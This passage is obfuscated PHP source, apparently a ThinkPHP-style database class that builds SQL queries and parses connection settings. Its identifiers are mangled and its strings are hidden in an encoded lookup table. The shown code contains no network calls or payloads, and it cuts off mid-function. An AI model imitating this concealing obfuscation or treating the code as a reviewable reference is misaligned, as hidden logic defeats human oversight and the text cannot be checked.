"\123\x45\114\105\103\124\45\104\111\123\x54\111\116\103\124\x25\x20\45\106\111\105\x4c\x44\x25\40\106\122\x4f\x4d\x20\x25\x54\x41\x42\x4c\105\45\x25\x4a\x4f\x49\116\x25\45\127\x48\105\x52\105\45\45\107\122\117\x55\x50\x25\x25\x48\101\126\x49\x4e\107\45\45\x4f\122\x44\x45\122\45\45\x4c\111\x4d\111\124\45\x20\45\x55\116\111\117\116\x25\x25\x43\x4f\115\x4d\105\116\124\45"; protected $bind = array(); public static function getInstance() { $ÅÜÖ²£Ä = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ùÆÎÔ“Ñ][965], $ÅÜÖ²£Ä); } public function factory($ÉÎœƒô½ = '') { $•¤¤ì =& $_SERVER[ùÆÎÔ“Ñ]; $ÉÎœƒô½ = $this->parseConfig($ÉÎœƒô½); if (empty($ÉÎœƒô½[$•¤¤ì[966]])) { think_exception(think_lang($•¤¤ì[967])); } $this->dbType = ucwords(strtolower($ÉÎœƒô½[$•¤¤ì[966]])); $¦Å…ãá¦ = $•¤¤ì[968] . $this->dbType; if (class_exists($¦Å…ãá¦)) { $Åİ»õÜæ = new $¦Å…ãá¦($ÉÎœƒô½); if ($•¤¤ì[969] != strtolower($ÉÎœƒô½[$•¤¤ì[966]])) { $Åİ»õÜæ->dbType = strtoupper($this->dbType); } else { $Åİ»õÜæ->dbType = $this->_getDsnType($ÉÎœƒô½[$•¤¤ì[921]]); } } else { think_exception(think_lang($•¤¤ì[970]) . $•¤¤ì[971] . $¦Å…ãá¦); } return $Åİ»õÜæ; } public function __call($œµ¹Üµ, $Ñë“¨Âæ) { if (method_exists($this, $œµ¹Üµ)) { return call_user_func_array(array($this, $œµ¹Üµ), $Ñë“¨Âæ); } } protected function _getDsnType($Òü²¹´÷) { $·ÎíèÈ­ = explode($_SERVER[ùÆÎÔ“Ñ][4], $Òü²¹´÷); $ØÓ¡ğØµ = strtoupper(trim($·ÎíèÈ­[0])); return $ØÓ¡ğØµ; } private function parseConfig($Êç½‚ä = '') { $´÷Ğ¾şâ =& $_SERVER[ùÆÎÔ“Ñ]; if (!empty($Êç½‚ä) && is_string($Êç½‚ä)) { $Êç½‚ä = $this->parseDSN($Êç½‚ä); } elseif (is_array($Êç½‚ä)) { $Êç½‚ä = array_change_key_case($Êç½‚ä); $Êç½‚ä = array($´÷Ğ¾şâ[966] => $Êç½‚ä[$´÷Ğ¾şâ[972]], $´÷Ğ¾şâ[893] => $Êç½‚ä[$´÷Ğ¾şâ[973]], $´÷Ğ¾şâ[894] => $Êç½‚ä[$´÷Ğ¾şâ[974]], $´÷Ğ¾şâ[891] => $Êç½‚ä[$´÷Ğ¾şâ[975]], $´÷Ğ¾şâ[892] => $Êç½‚ä[$´÷Ğ¾şâ[976]], $´÷Ğ¾şâ[21] => $Êç½‚ä[$´÷Ğ¾şâ[977]], $´÷Ğ¾şâ[921] => $Êç½‚ä[$´÷Ğ¾şâ[978]], $´÷Ğ¾şâ[17] => isset($Êç½‚ä[$´÷Ğ¾şâ[979]]) ? $Êç½‚ä[$´÷Ğ¾şâ[979]] : array()); } elseif (empty($Êç½‚ä)) { if (think_config($´÷Ğ¾şâ[980]) && $´÷Ğ¾şâ[969] != strtolower(think_config($´÷Ğ¾şâ[981]))) { $Êç½‚ä = $this->parseDSN(think_config($´÷Ğ¾şâ[980])); } else { $Êç½‚ä = array($´÷Ğ¾şâ[966] => think_config($´÷Ğ¾şâ[981]), $´÷Ğ¾şâ[893] => think_config($´÷Ğ¾şâ[982]), $´÷Ğ¾şâ[894] => think_config($´÷Ğ¾şâ[983]), $´÷Ğ¾şâ[891] => think_config($´÷Ğ¾şâ[984]), $´÷Ğ¾şâ[892] => think_config($´÷Ğ¾şâ[985]), $´÷Ğ¾şâ[21] => think_config($´÷Ğ¾şâ[246]), $´÷Ğ¾şâ[921] => think_config($´÷Ğ¾şâ[980]), $´÷Ğ¾şâ[17] => think_config($´÷Ğ¾şâ[986])); } } return $Êç½‚ä; } protected function initConnect($êÜŒî×— = true) { if (1 == think_config($_SERVER[ùÆÎÔ“Ñ][22])) { $this->_linkID = $this->multiConnect($êÜŒî×—); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $úæ»‘÷³ => $–µâƒ§“) { $this->_linkID = $–µâƒ§“; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ÏâØæî = false) { $–¥ãæ¢­ =& $_SERVER[ùÆÎÔ“Ñ]; static $“¶¡îâ„ = array(); static $¥îºÛ‡ø = -1; if (empty($“¶¡îâ„)) { foreach ($this->config as $Ù„ü¬ => $î—æ©Üê) { $“¶¡îâ„[$Ù„ü¬] = explode($–¥ãæ¢­[50], $î—æ©Üê); } } if (think_config($–¥ãæ¢­[987])) { if ($ÏâØæî || think_config($–¥ãæ¢­[395]) === !0) { $­Ÿ¹Ô…› = floor(mt_rand(0, think_config($–¥ãæ¢­[988]) - 1)); $¥îºÛ‡ø = $­Ÿ¹Ô…›; } else { if (is_numeric(think_config($–¥ãæ¢­[989]))) { $­Ÿ¹Ô…› = think_config($–¥ãæ¢­[989]); } else { $­Ÿ¹Ô…› = floor(mt_rand(think_config($–¥ãæ¢­[988]), count($“¶¡îâ„[$–¥ãæ¢­[891]]) - 1)); } } } else { $­Ÿ¹Ô…› = floor(mt_rand(0, count($“¶¡îâ„[$–¥ãæ¢­[891]]) - 1)); $¥îºÛ‡ø = $­Ÿ¹Ô…›; } $­Ÿ¹Ô…› = $¥îºÛ‡ø !== -1 ? $¥îºÛ‡ø : $­Ÿ¹Ô…›; $–Æü«ˆ = array($–¥ãæ¢­[893] => isset($“¶¡îâ„[$–¥ãæ¢­[893]][$­Ÿ¹Ô…›]) ? $“¶¡îâ„[$–¥ãæ¢­[893]][$­Ÿ¹Ô…›] : $“¶¡îâ„[$–¥ãæ¢­[893]][0], $–¥ãæ¢­[894] => isset($“¶¡îâ„[$–¥ãæ¢­[894]][$­Ÿ¹Ô…›]) ? $“¶¡îâ„[$–¥ãæ¢­[894]][$­Ÿ¹Ô…›] : $“¶¡îâ„[$–¥ãæ¢­[894]][0], $–¥ãæ¢­[891] => isset($“¶¡îâ„[$–¥ãæ¢­[891]][$­Ÿ¹Ô…›]) ? $“¶¡îâ„[$–¥ãæ¢­[891]][$­Ÿ¹Ô…›] : $“¶¡îâ„[$–¥ãæ¢­[891]][0], $–¥ãæ¢­[892] => isset($“¶¡îâ„[$–¥ãæ¢­[892]][$­Ÿ¹Ô…›]) ? $“¶¡îâ„[$–¥ãæ¢­[892]][$­Ÿ¹Ô…›] : $“¶¡îâ„[$–¥ãæ¢­[892]][0], $–¥ãæ¢­[21] => isset($“¶¡îâ„[$–¥ãæ¢­[21]][$­Ÿ¹Ô…›]) ? $“¶¡îâ„[$–¥ãæ¢­[21]][$­Ÿ¹Ô…›] : $“¶¡îâ„[$–¥ãæ¢­[21]][0], $–¥ãæ¢­[921] => isset($“¶¡îâ„[$–¥ãæ¢­[921]][$­Ÿ¹Ô…›]) ? $“¶¡îâ„[$–¥ãæ¢­[921]][$­Ÿ¹Ô…›] : $“¶¡îâ„[$–¥ãæ¢­[921]][0], $–¥ãæ¢­[17] => isset($“¶¡îâ„[$–¥ãæ¢­[17]][$­Ÿ¹Ô…›]) ? $“¶¡îâ„[$–¥ãæ¢­[17]][$­Ÿ¹Ô…›] : $“¶¡îâ„[$–¥ãæ¢­[17]][0]); return $this->connect($–Æü«ˆ, $­Ÿ¹Ô…›); } public function parseDSN($Ô…ùæ×) { $¡ÓëØº× =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($Ô…ùæ×)) { return !1; } $©‘³¸Ù… = parse_url($Ô…ùæ×); if ($©‘³¸Ù…[$¡ÓëØº×[180]]) { $İ²å×µÑ = array($¡ÓëØº×[966] => $©‘³¸Ù…[$¡ÓëØº×[180]], $¡ÓëØº×[893] => isset($©‘³¸Ù…[$¡ÓëØº×[600]]) ? $©‘³¸Ù…[$¡ÓëØº×[600]] : $¡ÓëØº×[12], $¡ÓëØº×[894] => isset($©‘³¸Ù…[$¡ÓëØº×[990]]) ? $©‘³¸Ù…[$¡ÓëØº×[990]] : $¡ÓëØº×[12], $¡ÓëØº×[891] => isset($©‘³¸Ù…[$¡ÓëØº×[181]]) ? $©‘³¸Ù…[$¡ÓëØº×[181]] : $¡ÓëØº×[12], $¡ÓëØº×[892] => isset($©‘³¸Ù…[$¡ÓëØº×[182]]) ? $©‘³¸Ù…[$¡ÓëØº×[182]] : $¡ÓëØº×[12], $¡ÓëØº×[21] => isset($©‘³¸Ù…[$¡ÓëØº×[84]]) ? substr($©‘³¸Ù…[$¡ÓëØº×[84]], 1) : $¡ÓëØº×[12]); } else { preg_match($¡ÓëØº×[991], trim($Ô…ùæ×), $±ŠÏ›±Ö); $İ²å×µÑ = array($¡ÓëØº×[966] => $±ŠÏ›±Ö[1], $¡ÓëØº×[893] => $±ŠÏ›±Ö[2], $¡ÓëØº×[894] => $±ŠÏ›±Ö[3], $¡ÓëØº×[891] => $±ŠÏ›±Ö[4], $¡ÓëØº×[892] => $±ŠÏ›±Ö[5], $¡ÓëØº×[21] => $±ŠÏ›±Ö[6]); } $İ²å×µÑ[$¡ÓëØº×[921]] = $¡ÓëØº×[12]; return $İ²å×µÑ; } protected function debug() { $¨ÄÛßÀĞ =& $_SERVER[ùÆÎÔ“Ñ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $¨ÄÛßÀĞ[992]; if (think_config($¨ÄÛßÀĞ[993])) { think_status($¨ÄÛßÀĞ[994]); think_trace($this->queryStr . $¨ÄÛßÀĞ[995] . think_status($¨ÄÛßÀĞ[24], $¨ÄÛßÀĞ[994], 6) . $¨ÄÛßÀĞ[996], $¨ÄÛßÀĞ[12], $¨ÄÛßÀĞ[997]); } } protected function parseLock($úÆìâ˜ = false) { $‰Äûæ‚Å =& $_SERVER[ùÆÎÔ“Ñ]; if (!$úÆìâ˜) { return $‰Äûæ‚Å[12]; } if ($‰Äûæ‚Å[923] == $this->dbType) { return $‰Äûæ‚Å[998]; } return $‰Äûæ‚Å[999]; } protected function parseSet($×ˆÜÌŒÌ) { $ù¿èöŞÑ =& $_SERVER[ùÆÎÔ“Ñ]; foreach ($×ˆÜÌŒÌ as $Ó¸‘®¤ä => $¸Ï€µô›) { if (is_array($¸Ï€µô›) && $ù¿èöŞÑ[297] == $¸Ï€µô›[0]) { $Ä‚È„»[] = $this->parseKey($Ó¸‘®¤ä) . $ù¿èöŞÑ[889] . $¸Ï€µô›[1]; } elseif (is_scalar($¸Ï€µô›) || is_null($¸Ï€µô›)) { $Ä‚È„»[] = $this->parseKey($Ó¸‘®¤ä) . $ù¿èöŞÑ[889] . $this->parseValue($¸Ï€µô›); } } return $ù¿èöŞÑ[1000] . implode($ù¿èöŞÑ[50], $Ä‚È„»); } protected function bindParam($¢ŸŒÔÁÇ, $¹Å“ï»¯) { $this->bind[$_SERVER[ùÆÎÔ“Ñ][4] . $¢ŸŒÔÁÇ] = $¹Å“ï»¯; } protected function parseBind($ÏéİïÒË) { $ÏéİïÒË = array_merge($this->bind, $ÏéİïÒË); $this->bind = array(); return $ÏéİïÒË; } function parseKey(&$³¦‰úû§, $²ÏÖ˜¦ = true) { if ($²ÏÖ˜¦) { $³¦‰úû§ = $this->parseKeyCheck($³¦‰úû§); } return $³¦‰úû§; } function parseKeyCheck($•íÍß”‘) { $ù§©©«Ï =& $_SERVER[ùÆÎÔ“Ñ]; $•íÍß”‘ = trim($•íÍß”‘); if (!preg_match($ù§©©«Ï[1001], $•íÍß”‘)) { think_exception($ù§©©«Ï[1002] . $•íÍß”‘); } return $•íÍß”‘; } protected function parseValue($µÊ§²) { $§¶€•¨ =& $_SERVER[ùÆÎÔ“Ñ]; if (is_string($µÊ§²)) { $µÊ§² = $§¶€•¨[962] . $this->escapeString($µÊ§²) . $§¶€•¨[962]; } elseif (isset($µÊ§²[0]) && is_string($µÊ§²[0]) && strtolower($µÊ§²[0]) == $§¶€•¨[297]) { $µÊ§² = $this->escapeString($µÊ§²[1]); } elseif (is_array($µÊ§²)) { $µÊ§² = array_map(array($this, $§¶€•¨[963]), $µÊ§²); } elseif (is_bool($µÊ§²)) { $µÊ§² = $µÊ§² ? $§¶€•¨[88] : $§¶€•¨[197]; } elseif (is_null($µÊ§²)) { $µÊ§² = $§¶€•¨[103]; } return $µÊ§²; } protected function parseField($Ñ¶ƒ‡­†) { $àçø¯ğ =& $_SERVER[ùÆÎÔ“Ñ]; if (is_string($Ñ¶ƒ‡­†) && strpos($Ñ¶ƒ‡­†, $àçø¯ğ[50])) { $Ñ¶ƒ‡­† = explode($àçø¯ğ[50], $Ñ¶ƒ‡­†); } if (is_array($Ñ¶ƒ‡­†)) { $ßºæÇ÷  = array(); foreach ($Ñ¶ƒ‡­† as $ÃÏòÛ¾¼ => $©Ô‡äŞ×) { if (!is_numeric($ÃÏòÛ¾¼)) { $ßºæÇ÷ [] = $this->parseKey($ÃÏòÛ¾¼, !1) . $àçø¯ğ[1003] . $this->parseKey($©Ô‡äŞ×); } else { $ßºæÇ÷ [] = $this->parseKey($©Ô‡äŞ×); } } $¿éˆµÛ = implode($àçø¯ğ[50], $ßºæÇ÷ ); } elseif (is_string($Ñ¶ƒ‡­†) && !empty($Ñ¶ƒ‡­†)) { $¿éˆµÛ = $Ñ¶ƒ‡­†; } else { $¿éˆµÛ = $àçø¯ğ[188]; } return $¿éˆµÛ; } protected function parseTable($Í‰şÉ†ˆ) { $Ÿœ‰ì =& $_SERVER[ùÆÎÔ“Ñ]; if (is_array($Í‰şÉ†ˆ)) { $ä…¢‹å = array(); foreach ($Í‰şÉ†ˆ as $¡üÁÜ”Ú => $ ›ç·êÊ) { if (!is_numeric($¡üÁÜ”Ú)) { $ä…¢‹å[] = $this->parseKey($¡üÁÜ”Ú) . $Ÿœ‰ì[53] . $this->parseKey($ ›ç·êÊ); } else { $ä…¢‹å[] = $this->parseKey($¡üÁÜ”Ú); } } $Í‰şÉ†ˆ = $ä…¢‹å; } elseif (is_string($Í‰şÉ†ˆ)) { if (strstr($Í‰şÉ†ˆ, $Ÿœ‰ì[53])) { return $Í‰şÉ†ˆ; } $Í‰şÉ†ˆ = explode($Ÿœ‰ì[50], $Í‰şÉ†ˆ); array_walk($Í‰şÉ†ˆ, array($this, $Ÿœ‰ì[911])); } return $Ÿœ‰ì[905] . trim(implode($Ÿœ‰ì[1004], $Í‰şÉ†ˆ), $Ÿœ‰ì[385]) . $Ÿœ‰ì[905]; } protected function parseWhere($ÔÈ®ğëé) { $†Äœ”å€ =& $_SERVER[ùÆÎÔ“Ñ]; $Û¬×ïíÅ = $†Äœ”å€[12]; if (is_string($ÔÈ®ğëé)) { $Û¬×ïíÅ = $ÔÈ®ğëé; } else { $çõ†÷şä = isset($ÔÈ®ğëé[$†Äœ”å€[1005]]) ? strtoupper($ÔÈ®ğëé[$†Äœ”å€[1005]]) : $†Äœ”å€[12]; if (in_array($çõ†÷şä, array($†Äœ”å€[1006], $†Äœ”å€[1007], $†Äœ”å€[1008]))) { $çõ†÷şä = $†Äœ”å€[53] . $çõ†÷şä . $†Äœ”å€[53]; unset($ÔÈ®ğëé[$†Äœ”å€[1005]]); } else { $çõ†÷şä = $†Äœ”å€[1009]; } foreach ($ÔÈ®ğëé as $·ºÊ²¾ => $äÙÈüÜ†) { $Û¬×ïíÅ .= $†Äœ”å€[277]; if (is_numeric($·ºÊ²¾)) { $·ºÊ²¾ = $†Äœ”å€[1010]; } if (0 === strpos($·ºÊ²¾, $†Äœ”å€[11])) { $Û¬×ïíÅ .= $this->parseThinkWhere($·ºÊ²¾, $äÙÈüÜ†); } else { if (!preg_match($†Äœ”å€[1011], trim($·ºÊ²¾))) { think_exception(think_lang($†Äœ”å€[1012]) . $†Äœ”å€[4] . $·ºÊ²¾); } $°ËÅğà¿ = is_array($äÙÈüÜ†) && isset($äÙÈüÜ†[$†Äœ”å€[1013]]); $·ºÊ²¾ = trim($·ºÊ²¾); if (strpos($·ºÊ²¾, $†Äœ”å€[283])) { $¼†í¶Ø¢ = explode($†Äœ”å€[283], $·ºÊ²¾); $ô¤æİŸ½ = array(); foreach ($¼†í¶Ø¢ as $—‹îşï­ => $ãñŸìáş) { $³”·Ìï = $°ËÅğà¿ ? $äÙÈüÜ†[$—‹îşï­] : $äÙÈüÜ†; $ô¤æİŸ½[] = $†Äœ”å€[260] . $this->parseWhereItem($this->parseKey($ãñŸìáş), $³”·Ìï) . $†Äœ”å€[910]; } $Û¬×ïíÅ .= implode($†Äœ”å€[1014], $ô¤æİŸ½); } elseif (strpos($·ºÊ²¾, $†Äœ”å€[284])) { $¼†í¶Ø¢ = explode($†Äœ”å€[284], $·ºÊ²¾); $ô¤æİŸ½ = array(); foreach ($¼†í¶Ø¢ as $—‹îşï­ => $ãñŸìáş) { $³”·Ìï = $°ËÅğà¿ ? $äÙÈüÜ†[$—‹îşï­] : $äÙÈüÜ†; $ô¤æİŸ½[] = $†Äœ”å€[260] . $this->parseWhereItem($this->parseKey($ãñŸìáş), $³”·Ìï) . $†Äœ”å€[910]; } $Û¬×ïíÅ .= implode($†Äœ”å€[1009], $ô¤æİŸ½); } else { $Û¬×ïíÅ .= $this->parseWhereItem($this->parseKey($·ºÊ²¾), $äÙÈüÜ†); } } $Û¬×ïíÅ .= $†Äœ”å€[278] . $çõ†÷şä; } $Û¬×ïíÅ = substr($Û¬×ïíÅ, 0, -strlen($çõ†÷şä)); } return empty($Û¬×ïíÅ) ? $†Äœ”å€[12] : $†Äœ”å€[1015] . $Û¬×ïíÅ; } protected function parseWhereItem($è›Ãúª, $Û¸Ãµ Ş) { $‰„Ó¡Äâ =& $_SERVER[ùÆÎÔ“Ñ]; $Ä±ô×ßÛ = $‰„Ó¡Äâ[12]; if (is_array($Û¸Ãµ Ş)) { if (is_string($Û¸Ãµ Ş[0])) { $ƒœñÈı = strtolower($Û¸Ãµ Ş[0]); if (in_array($Û¸Ãµ Ş[0], array($‰„Ó¡Äâ[889], $‰„Ó¡Äâ[1016], $‰„Ó¡Äâ[1017], $‰„Ó¡Äâ[1018], $‰„Ó¡Äâ[1019], $‰„Ó¡Äâ[1020]))) { $Ä±ô×ßÛ .= $è›Ãúª . $‰„Ó¡Äâ[53] . $Û¸Ãµ Ş[0] . $‰„Ó¡Äâ[53] . $this->parseValue($Û¸Ãµ Ş[1]); } elseif (preg_match($‰„Ó¡Äâ[1021], $Û¸Ãµ Ş[0])) { $Ä±ô×ßÛ .= $è›Ãúª . $‰„Ó¡Äâ[53] . $this->exp[$ƒœñÈı] . $‰„Ó¡Äâ[53] . $this->parseValue($Û¸Ãµ Ş[1]); } elseif (preg_match($‰„Ó¡Äâ[1022], $Û¸Ãµ Ş[0])) { if (is_array($Û¸Ãµ Ş[1])) { $±İÖæÖØ = isset($Û¸Ãµ Ş[2]) ? strtoupper($Û¸Ãµ Ş[2]) : $‰„Ó¡Äâ[1007]; if (in_array($±İÖæÖØ, array($‰„Ó¡Äâ[1006], $‰„Ó¡Äâ[1007], $‰„Ó¡Äâ[1008]))) { $´¹Ì»¾ = array(); foreach ($Û¸Ãµ Ş[1] as $Üöá˜’š) { $´¹Ì»¾[] = $è›Ãúª . $‰„Ó¡Äâ[53] . $this->exp[$ƒœñÈı] . $‰„Ó¡Äâ[53] . $this->parseValue($Üöá˜’š); } $Ä±ô×ßÛ .= $‰„Ó¡Äâ[260] . implode($‰„Ó¡Äâ[53] . $±İÖæÖØ . $‰„Ó¡Äâ[53], $´¹Ì»¾) . $‰„Ó¡Äâ[910]; } } else { $Ä±ô×ßÛ .= $è›Ãúª . $‰„Ó¡Äâ[53] . $this->exp[$ƒœñÈı] . $‰„Ó¡Äâ[53] . $this->parseValue($Û¸Ãµ Ş[1]); } } elseif ($‰„Ó¡Äâ[297] == $ƒœñÈı) { $Ä±ô×ßÛ .= $‰„Ó¡Äâ[908] . $è›Ãúª . $‰„Ó¡Äâ[53] . $Û¸Ãµ Ş[1] . $‰„Ó¡Äâ[1023]; } elseif (preg_match($‰„Ó¡Äâ[1024], $Û¸Ãµ Ş[0])) { $Ä±ô×ßÛ .= $Û¸Ãµ Ş[0]; } elseif (preg_match($‰„Ó¡Äâ[1025], $Û¸Ãµ Ş[0])) { if (isset($Û¸Ãµ Ş[2]) && $‰„Ó¡Äâ[297] == $Û¸Ãµ Ş[2]) { $Ä±ô×ßÛ .= $è›Ãúª . $‰„Ó¡Äâ[53] . $this->exp[$ƒœñÈı] . $‰„Ó¡Äâ[53] . $Û¸Ãµ Ş[1]; } else { if (is_string($Û¸Ãµ Ş[1])) { $Û¸Ãµ Ş[1] = explode($‰„Ó¡Äâ[50], $Û¸Ãµ Ş[1]); } $º€–ïˆÒ = implode($‰„Ó¡Äâ[50], $this->parseValue($Û¸Ãµ Ş[1])); $Ä±ô×ßÛ .= $è›Ãúª . $‰„Ó¡Äâ[53] . $this->exp[$ƒœñÈı] . $‰„Ó¡Äâ[908] . $º€–ïˆÒ . $‰„Ó¡Äâ[910]; } } elseif (preg_match($‰„Ó¡Äâ[1026], $Û¸Ãµ Ş[0])) { $–íÓÚ“ = is_string($Û¸Ãµ Ş[1]) ? explode($‰„Ó¡Äâ[50], $Û¸Ãµ Ş[1]) : $Û¸Ãµ Ş[1]; $Ä±ô×ßÛ .= $‰„Ó¡Äâ[908] . $è›Ãúª . $‰„Ó¡Äâ[53] . $this->exp[$ƒœñÈı] . $‰„Ó¡Äâ[53] . $this->parseValue($–íÓÚ“[0]) . $‰„Ó¡Äâ[1009] . $this->parseValue($–íÓÚ“[1]) . $‰„Ó¡Äâ[278]; } else { think_exception(think_lang($‰„Ó¡Äâ[1012]) . $‰„Ó¡Äâ[4] . $Û¸Ãµ Ş[0]); } } else { $Œ¯öª¹¯ = count($Û¸Ãµ Ş); $È¦¼„– = $‰„Ó¡Äâ[12]; if (is_string($Û¸Ãµ Ş[$Œ¯öª¹¯ - 1])) { $È¦¼„– = isset($Û¸Ãµ Ş[$Œ¯öª¹¯ - 1]) ? strtoupper($Û¸Ãµ Ş[$Œ¯öª¹¯ - 1]) : $‰„Ó¡Äâ[12]; if (in_array($È¦¼„–, array($‰„Ó¡Äâ[1006], $‰„Ó¡Äâ[1007], $‰„Ó¡Äâ[1008]))) { $Œ¯öª¹¯ = $Œ¯öª¹¯ - 1; } } else { $È¦¼„– = $‰„Ó¡Äâ[1006]; } for ($Ææõìòç = 0; $Ææõìòç < $Œ¯öª¹¯; $Ææõìòç++) { $–íÓÚ“ = is_array($Û¸Ãµ Ş[$Ææõìòç]) ? $Û¸Ãµ Ş[$Ææõìòç][1] : $Û¸Ãµ Ş[$Ææõìòç]; if ($‰„Ó¡Äâ[297] == strtolower($Û¸Ãµ Ş[$Ææõìòç][0])) { $Ä±ô×ßÛ .= $‰„Ó¡Äâ[260] . $è›Ãúª . $‰„Ó¡Äâ[53] . $–íÓÚ“ . $‰„Ó¡Äâ[1023] . $È¦¼„– . $‰„Ó¡Äâ[53]; } else { $°‘ğ‡“Ó = is_array($Û¸Ãµ Ş[$Ææõìòç]) ? $this->exp[strtolower($Û¸Ãµ Ş[$Ææõìòç][0])] : $‰„Ó¡Äâ[889]; if (!$°‘ğ‡“Ó && is_array($Û¸Ãµ Ş[$Ææõìòç]) && in_array($Û¸Ãµ Ş[$Ææõìòç][0], array($‰„Ó¡Äâ[889], $‰„Ó¡Äâ[1016], $‰„Ó¡Äâ[1017], $‰„Ó¡Äâ[1018], $‰„Ó¡Äâ[1019], $‰„Ó¡Äâ[1020]))) { $°‘ğ‡“Ó = $Û¸Ãµ Ş[$Ææõìòç][0]; } $Ä±ô×ßÛ .= $‰„Ó¡Äâ[260] . $è›Ãúª . $‰„Ó¡Äâ[53] . $°‘ğ‡“Ó . $‰„Ó¡Äâ[53] . $this->parseValue($–íÓÚ“) . $‰„Ó¡Äâ[1023] . $È¦¼„– . $‰„Ó¡Äâ[53]; } } $Ä±ô×ßÛ = substr($Ä±ô×ßÛ, 0, -4); } } else { $Ä±ô×ßÛ .= $è›Ãúª . $‰„Ó¡Äâ[1027] . $this->parseValue($Û¸Ãµ Ş); } return $Ä±ô×ßÛ; } protected function parseThinkWhere($¥ºå Ëí, $Æ§Ï½úÆ) { $ö®‹ÏŠ =& $_SERVER[ùÆÎÔ“Ñ]; $«ı²Šã« = $ö®‹ÏŠ[12]; switch ($¥ºå Ëí) { case $ö®‹ÏŠ[352]: $«ı²Šã« = $Æ§Ï½úÆ; break; case $ö®‹ÏŠ[1010]: $«ı²Šã« = is_string($Æ§Ï½úÆ) ? $Æ§Ï½úÆ : substr($this->parseWhere($Æ§Ï½úÆ), 6); break; case $ö®‹ÏŠ[1028]: parse_str($Æ§Ï½úÆ, $ëÂôİ¢ô); if (isset($ëÂôİ¢ô[$ö®‹ÏŠ[1005]])) { $ö‰„êÊå = $ö®‹ÏŠ[53] . strtoupper($ëÂôİ¢ô[$ö®‹ÏŠ[1005]]) . $ö®‹ÏŠ[53]; unset($ëÂôİ¢ô[$ö®‹ÏŠ[1005]]); } else { $ö‰„êÊå = $ö®‹ÏŠ[1009]; } $Æ®ò¿« = array(); foreach ($ëÂôİ¢ô as $ÍÚÖËÏ => $•ÇóÌµ–) { $Æ®ò¿«[] = $this->parseKey($ÍÚÖËÏ) . $ö®‹ÏŠ[1027] . $this->parseValue($•ÇóÌµ–); } $«ı²Šã« = implode($ö‰„êÊå, $Æ®ò¿«); break; } return $«ı²Šã«; } protected function parseLimit($éÂ”ú²) { $¯Âıú¶ =& $_SERVER[ùÆÎÔ“Ñ]; return !empty($éÂ”ú²) ? $¯Âıú¶[51] . $éÂ”ú² . $¯Âıú¶[53] : $¯Âıú¶[12]; } protected function parseJoin($“òö‰áÎ) { $®¸¨‡ =& $_SERVER[ùÆÎÔ“Ñ]; $Ğ«­÷»‚ = $®¸¨‡[12]; if (!empty($“òö‰áÎ)) { if (is_array($“òö‰áÎ)) { foreach ($“òö‰áÎ as $°ÌÍáº => $Ğ””Œ°µ) { if (!1 !== stripos($Ğ””Œ°µ, $®¸¨‡[1029])) { $Ğ«­÷»‚ .= $®¸¨‡[53] . $Ğ””Œ°µ; } else { $Ğ«­÷»‚ .= $®¸¨‡[1030] . $Ğ””Œ°µ; } } } else { $Ğ«­÷»‚ .= $®¸¨‡[1030] . $“òö‰áÎ; } } $Ğ«­÷»‚ = preg_replace($®¸¨‡[1031], think_config($®¸¨‡[935]) . $®¸¨‡[1032], $Ğ«­÷»‚); return $Ğ«­÷»‚; } protected function parseOrder($ é†¯±İ) { $çéïÈåÍ =& $_SERVER[ùÆÎÔ“Ñ]; if (is_array($ é†¯±İ)) { $»ƒÙ‘ğ = array(); foreach ($ é†¯±İ as $ÁŠê™‡… => $õïëÙ) { if (is_numeric($ÁŠê™‡…)) { $»ƒÙ‘ğ[] = $this->parseKey($õïëÙ); } else { $õïëÙ = in_array(strtoupper(trim($õïëÙ)), array($çéïÈåÍ[1033], $çéïÈåÍ[1034])) ? $çéïÈåÍ[53] . $õïëÙ : $çéïÈåÍ[12]; if (preg_match($çéïÈåÍ[1035], $ÁŠê™‡…)) { $»ƒÙ‘ğ[] = $this->parseKey($ÁŠê™‡…) . $õïëÙ; } else { think_exception($çéïÈåÍ[1036] . $ÁŠê™‡…); } } } $ é†¯±İ = implode($çéïÈåÍ[50], $»ƒÙ‘ğ); } return !empty($ é†¯±İ) ? $çéïÈåÍ[1037] . $ é†¯±İ : $çéïÈåÍ[12]; } protected function parseGroup($¢ËàæĞ…) { $–Ş¼ºŞÕ =& $_SERVER[ùÆÎÔ“Ñ]; return !empty($¢ËàæĞ…) ? $–Ş¼ºŞÕ[1038] . $¢ËàæĞ… : $–Ş¼ºŞÕ[12]; } protected function parseHaving($ŸÌ¡ø³Ş) { $Ã¹¦ ÍÆ =& $_SERVER[ùÆÎÔ“Ñ]; return !empty($ŸÌ¡ø³Ş) ? $Ã¹¦ ÍÆ[1039] . $ŸÌ¡ø³Ş : $Ã¹¦ ÍÆ[12]; } protected function parseComment($¨Ã€Íù) { $ßë¦µ£Ô =& $_SERVER[ùÆÎÔ“Ñ]; return !empty($¨Ã€Íù) ? $ßë¦µ£Ô[1040] . $¨Ã€Íù . $ßë¦µ£Ô[1041] : $ßë¦µ£Ô[12]; } protected function parseDistinct($Ö¼û¨½°) { $õâÇÁ»” =& $_SERVER[ùÆÎÔ“Ñ]; return !empty($Ö¼û¨½°) ? $õâÇÁ»”[1042] : $õâÇÁ»”[12]; } protected function parseUnion($œ¶ô´´) { $üæõ’ê =& $_SERVER[ùÆÎÔ“Ñ]; if (empty($œ¶ô´´)) { return $üæõ’ê[12]; } if (isset($œ¶ô´´[$üæõ’ê[348]])) { $‹ºÒ›„… = $üæõ’ê[1043]; unset($œ¶ô´´[$üæõ’ê[348]]); } else { $‹ºÒ›„… = $üæõ’ê[1044]; } foreach ($œ¶ô´´ as $ùõ¶‹©») { $™§¡ˆ‘İ[] = $‹ºÒ›„… . (is_array($ùõ¶‹©») ? $this->buildSelectSql($ùõ¶‹©») : $ùõ¶‹©»); } return implode($üæõ’ê[53], $™§¡ˆ‘İ); } public function insert($‡‘ò‘„, $¶²•Í¢· = array(), $‚†óè£Ã = false) { $ì‚®â‚à =& $_SERVER[ùÆÎÔ“Ñ]; $’œøÑ™Ç = $ö§½¯äô = array(); $this->model = $¶²•Í¢·[$ì‚®â‚à[281]]; foreach ($‡‘ò‘„ as $­Öôëã˜ => $Ò«Ì€‡) { if 